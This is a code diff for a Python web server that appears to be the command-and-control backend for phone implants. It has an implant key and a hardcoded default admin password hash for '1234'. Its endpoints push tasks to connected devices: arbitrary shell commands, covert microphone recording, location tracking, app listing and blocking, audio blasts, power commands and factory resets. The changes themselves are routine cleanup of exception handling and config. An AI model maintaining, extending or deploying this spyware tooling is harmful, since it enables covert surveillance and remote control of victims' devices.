@@ -39,11 +39,8 @@ ws_manager = ConnectionManager()
 
 DB_FILE = "telemetry.db"
 ADMIN_USERNAME = os.getenv("ADMIN_USERNAME", "admin")
-ADMIN_PASSWORD_HASH = os.getenv("ADMIN_HASH")
-
-if not ADMIN_PASSWORD_HASH:
-    # Default fallback placeholder for deployment initialization
-    ADMIN_PASSWORD_HASH = "03ac674216f3e15c761ee1a5e255f067953623c8b388b4459e13f978d7c846f4"  # SHA-256 of "1234"
+# Default fallback placeholder for deployment initialization
+ADMIN_PASSWORD_HASH = str(os.getenv("ADMIN_HASH") or "03ac674216f3e15c761ee1a5e255f067953623c8b388b4459e13f978d7c846f4")
 
 IMPLANT_KEY = os.getenv("IMPLANT_KEY", "DeltaForce2027")
 
@@ -179,7 +176,7 @@ def run_auto_cleanup(db: sqlite3.Connection):
                         ts = int(parts[-1].split('.')[0])
                         if ts < seven_days_ago:
                             os.remove(os.path.join("static/audio", f))
-                    except:
+                    except Exception:
                         pass
 
 @asynccontextmanager
@@ -208,7 +205,7 @@ async def websocket_endpoint(websocket: WebSocket):
 
                 if "device_id" in data:
                     client_id = data["device_id"]
-                    global ws_manager
+
                     ws_manager.active_connections[client_id] = websocket
                     
                     import sqlite3, time
@@ -583,7 +580,7 @@ async def set_interval(device_id: str = Form(...), interval: int = Form(...), re
     if device_id in ws_manager.active_connections:
         try:
             await ws_manager.active_connections[device_id].send_text(json.dumps({"task": "set_interval", "interval": interval}))
-        except:
+        except Exception:
             pass
     return {"status": "success"}
 
@@ -595,7 +592,7 @@ async def set_notification(device_id: str = Form(...), state: int = Form(...), t
     if device_id in ws_manager.active_connections:
         try:
             await ws_manager.active_connections[device_id].send_text(json.dumps({"task": "system_alert", "state": state, "text": text}))
-        except:
+        except Exception:
             pass
     return {"status": "success"}
 
@@ -607,7 +604,7 @@ async def set_audio(device_id: str = Form(...), play_audio: int = Form(...), req
     if device_id in ws_manager.active_connections and play_audio == 1:
         try:
             await ws_manager.active_connections[device_id].send_text(json.dumps({"task": "audio_blast", "play": play_audio}))
-        except:
+        except Exception:
             pass
     return {"status": "success"}
 
@@ -619,7 +616,7 @@ async def set_record_audio(device_id: str = Form(...), record_audio: int = Form(
     if device_id in ws_manager.active_connections and record_audio == 1:
         try:
             await ws_manager.active_connections[device_id].send_text(json.dumps({"task": "mic_record", "record": record_audio}))
-        except:
+        except Exception:
             pass
     return {"status": "success"}
 
@@ -634,7 +631,7 @@ async def set_power_cmd(device_id: str = Form(...), action: str = Form(...), req
     if device_id in ws_manager.active_connections:
         try:
             await ws_manager.active_connections[device_id].send_text(json.dumps({"task": "power_cmd", "action": action}))
-        except:
+        except Exception:
             pass
     return {"status": "success"}
 
@@ -644,7 +641,7 @@ async def run_shell_command(device_id: str = Form(...), command: str = Form(...)
     if device_id in ws_manager.active_connections:
         try:
             await ws_manager.active_connections[device_id].send_text(json.dumps({"task": "shell", "command": command}))
-        except:
+        except Exception:
             pass
     return {"status": "success"}
 
@@ -654,7 +651,7 @@ async def set_factory_reset(device_id: str = Form(...), request: Request = Depen
     if device_id in ws_manager.active_connections:
         try:
             await ws_manager.active_connections[device_id].send_text(json.dumps({"task": "factory_reset"}))
-        except:
+        except Exception:
             pass
     return {"status": "success"}
 
@@ -667,7 +664,7 @@ async def check_location_state(request: Request, device_id: str = Form(...)):
         try:
             import json
             await ws_manager.active_connections[device_id].send_text(json.dumps({"task": "check_location_state"}))
-        except:
+        except Exception:
             pass
     return JSONResponse({"status": "sent"})
 
@@ -679,7 +676,7 @@ async def request_installed_apps(request: Request, device_id: str = Form(...)):
         try:
             import json
             await ws_manager.active_connections[device_id].send_text(json.dumps({"task": "refresh_installed_apps"}))
-        except:
+        except Exception:
             pass
     return JSONResponse({"status": "sent"})
 
@@ -698,7 +695,7 @@ async def set_location_tracking(request: Request, device_id: str = Form(...), en
         try:
             import json
             await ws_manager.active_connections[device_id].send_text(json.dumps({"task": "set_location", "track": enable}))
-        except:
+        except Exception:
             pass
     return JSONResponse({"status": "success"})
 
@@ -728,7 +725,7 @@ async def set_blocked_apps(request: Request, payload: dict = Body(...)):
         try:
             import json
             await ws_manager.active_connections[device_id].send_text(json.dumps({"task": "update_blocked_apps", "apps": apps}))
-        except:
+        except Exception:
             pass
             
     return JSONResponse({"status": "success"})
